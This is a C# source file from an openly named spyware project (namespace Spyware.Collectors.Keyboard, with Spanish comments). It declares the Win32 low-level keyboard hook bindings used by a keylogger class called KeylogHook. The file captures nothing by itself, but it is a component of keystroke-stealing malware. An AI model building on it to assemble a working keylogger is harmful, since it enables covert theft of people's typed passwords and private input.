using System.Runtime.InteropServices;

namespace Spyware.Collectors.Keyboard;

/// <summary>
/// API de Windows necesaria para el hook de teclado. Es interna a propósito: el único
/// consumidor es <see cref="KeylogHook"/>, y los DllImport públicos disparan CA1401.
/// </summary>
internal static class NativeMethods
{
    public const int WhKeyboardLl = 13;

    /// <summary>Procedimiento del hook. Debe permanecer vivo mientras esté instalado.</summary>
    public delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);

    /// <summary>KBDLLHOOKSTRUCT tal y como la documenta MSDN (x64: 32 bytes).</summary>
    [StructLayout(LayoutKind.Sequential)]
    public struct Kbdllhookstruct
    {
        public int VirtualKey;
        public uint ScanCode;

        /// <summary>LLKHF_EXTENDED 0x01, LLKHF_INJECTED 0x10, LLKHF_ALTDOWN 0x20, LLKHF_UP 0x40.</summary>
        public uint Flags;

        public uint Time;
        public IntPtr ExtraInfo;
    }

    [DllImport("user32.dll", SetLastError = true)]
    public static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll")]
    public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
    public static extern IntPtr GetModuleHandle(string? lpModuleName);
}
